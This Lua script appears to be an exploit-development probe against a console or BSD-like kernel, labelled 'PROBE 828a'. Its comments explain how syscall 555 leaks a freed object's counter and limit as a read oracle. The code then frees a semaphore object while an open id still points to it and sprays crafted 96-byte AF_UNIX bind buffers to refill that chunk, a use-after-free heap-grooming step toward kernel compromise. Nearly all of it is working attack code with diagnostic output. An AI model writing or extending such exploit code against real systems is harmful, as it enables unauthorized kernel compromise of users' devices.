-- CRASH_CLASS: HIGH
-- PROBE 828a: osem counter oracle, and whether bind() refills the freed chunk
--
-- 555(id,n) (13.60 offset 0xC165D0) calls op(obj, n) at 0xC15AA0:
--     eax = [obj+0x40]; eax += n; if sign -> EINVAL; if eax > [obj+0x4c] -> EINVAL
--     [obj+0x40] = eax;  then if n > 0 it walks [obj+0x30] as a waiter list
-- So the pair ([obj+0x40], [obj+0x4c]) is a counter with a limit, and the return
-- value tells us whether counter+n <= limit. That makes 555 a *read oracle* for
-- those 8 bytes of any chunk an open id still points at.
--
-- 549 create passes a3 = uap[2] and a4 = uap[3] straight to the object init, so if
-- the oracle tracks those arguments we control the counter and limit of a fresh
-- object - and of anything that later occupies the same 96-byte chunk.
--
-- sys 104 bind allocates malloc(len) (len <= 0xff) and copies the caller's
-- sockaddr into it, so a 0x60-byte AF_UNIX bind is a user-filled 96-byte
-- allocation. If it is retained by the socket, it is a controlled refill.

print("=== PROBE 828a: osem counter oracle and bind refill ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function mkname(s)
    local p = memory.alloc(0x40)
    for i = 0, 0x3F do memory.write_byte(p + i, 0) end
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    return p
end
local function call(sc, ...)
    local a = {...}
    local ok, r = pcall(function() return sc(unpack(a)) end)
    return to_num(r or 0)
end

local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
local sc555 = make_syscall(555)
local sc97 = make_syscall(97)
local sc104 = make_syscall(104)

-- [A] do a3/a4 become the counter and the limit?
do
    local n = mkname("ora1")
    local id = call(sc549, n, uint64(0x101), uint64(0), uint64(0x40))
    print(string.format("[A] create(a3=0,a4=0x40) = %s", hx(id)))
    print(string.format("[A] 555(+0)=%s  555(+0x20)=%s  555(+0x40)=%s  555(+0x41)=%s  555(+0x1000)=%s",
        hx(call(sc555, uint64(id), uint64(0))),
        hx(call(sc555, uint64(id), uint64(0x20))),
        hx(call(sc555, uint64(id), uint64(0x40))),
        hx(call(sc555, uint64(id), uint64(0x41))),
        hx(call(sc555, uint64(id), uint64(0x1000)))))
    call(sc550, uint64(id))
end

-- [B] the same oracle after the object is freed through its create id
local n = mkname("ora2")
local id0 = call(sc549, n, uint64(0x101), uint64(0), uint64(0x80))
local id1 = call(sc551, n)
print(string.format("[B] create=%s open=%s", hx(id0), hx(id1)))
print(string.format("[B] live   555(open,+0x70)=%s  555(open,+0x20)=%s",
    hx(call(sc555, uint64(id1), uint64(0x70))), hx(call(sc555, uint64(id1), uint64(0x20)))))
print(string.format("[B] destroy create = %s", hx(call(sc550, uint64(id0)))))
print(string.format("[B] freed  555(open,+0)=%s  555(open,+0x1000)=%s  (limit still 0x80?)",
    hx(call(sc555, uint64(id1), uint64(0))), hx(call(sc555, uint64(id1), uint64(0x1000)))))

-- [C] try to refill the chunk with a user-controlled 0x60-byte bind buffer
local fd = call(sc97, uint64(1), uint64(1), uint64(0))   -- AF_UNIX, SOCK_STREAM
print(string.format("[C] socket(AF_UNIX,STREAM) = %s", hx(fd)))
local sa = memory.alloc(0x60)
for i = 0, 0x5F do memory.write_byte(sa + i, 0) end
memory.write_byte(sa, 0x60)      -- sun_len
memory.write_byte(sa + 1, 1)     -- AF_UNIX
local path = "/tmp/p828a"
for i = 1, #path do memory.write_byte(sa + 1 + i, string.byte(path, i)) end
-- counter = 1 at +0x40, limit = 2 at +0x4c
memory.write_dword(sa + 0x40, 1)
memory.write_dword(sa + 0x4C, 2)
if fd >= 0 then
    local rb = call(sc104, uint64(fd), uint64(to_num(sa)), uint64(0x60))
    print(string.format("[C] bind(fd, sa, 0x60) = %s", hx(rb)))
    print(string.format("[C] after bind  555(open,+0)=%s  555(open,+1)=%s  555(open,+2)=%s",
        hx(call(sc555, uint64(id1), uint64(0))),
        hx(call(sc555, uint64(id1), uint64(1))),
        hx(call(sc555, uint64(id1), uint64(2)))))
    -- a second bind, in case the first was consumed
    local sa2 = memory.alloc(0x60)
    for i = 0, 0x5F do memory.write_byte(sa2 + i, 0) end
    memory.write_byte(sa2, 0x60)
    memory.write_byte(sa2 + 1, 1)
    local p2 = "/tmp/p828b"
    for i = 1, #p2 do memory.write_byte(sa2 + 1 + i, string.byte(p2, i)) end
    memory.write_dword(sa2 + 0x40, 0x10)
    memory.write_dword(sa2 + 0x4C, 0x08)
    local rb2 = call(sc104, uint64(fd), uint64(to_num(sa2)), uint64(0x60))
    print(string.format("[C] second bind = %s", hx(rb2)))
    print(string.format("[C] after 2nd   555(open,+0)=%s  555(open,+0x1000)=%s",
        hx(call(sc555, uint64(id1), uint64(0))), hx(call(sc555, uint64(id1), uint64(0x1000)))))
else
    print("[C] skipped: no socket")
end

-- [D] many small creates, which allocate 0x20 name + 0x60 object each
print("[D] creating six objects to see whether the stale id follows the chunk")
for i = 1, 6 do
    local nm = mkname("refill" .. i)
    local rid = call(sc549, nm, uint64(0x101), uint64(0), uint64(0x20))
    print(string.format("[D] create %d = %s", i, hx(rid)))
end
print(string.format("[D] 555(open,+0)=%s  555(open,+0x1000)=%s  555(open,+0x30)=%s",
    hx(call(sc555, uint64(id1), uint64(0))),
    hx(call(sc555, uint64(id1), uint64(0x1000))),
    hx(call(sc555, uint64(id1), uint64(0x30)))))

print("[E] alive=true")
print("=== PROBE 828a COMPLETE ===")
